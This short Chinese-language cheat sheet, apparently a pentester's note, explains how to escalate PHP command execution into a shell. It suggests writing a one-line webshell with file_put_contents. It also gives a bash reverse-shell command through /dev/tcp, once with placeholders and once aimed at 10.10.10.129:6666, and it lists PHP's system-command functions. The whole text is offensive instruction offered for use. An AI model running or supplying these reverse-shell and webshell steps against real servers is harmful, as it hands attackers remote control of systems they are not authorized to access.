### php命令执行getshell

前提条件：获得php命令执行

方法1:file_put_contents(filename,content)向当前目录写入一句话

方法2：反弹shell，构建一句话

反弹shell命令如下：

```shell
bash -i >& /dev/tcp/ip/port 0>&1
```

php系统命令函数：

```
system()
passthru()
exec()
shell_exec()
popen()
proc_open()
pcntl_exec()
```

bash -i >& /dev/tcp/10.10.10.129/6666 0>&1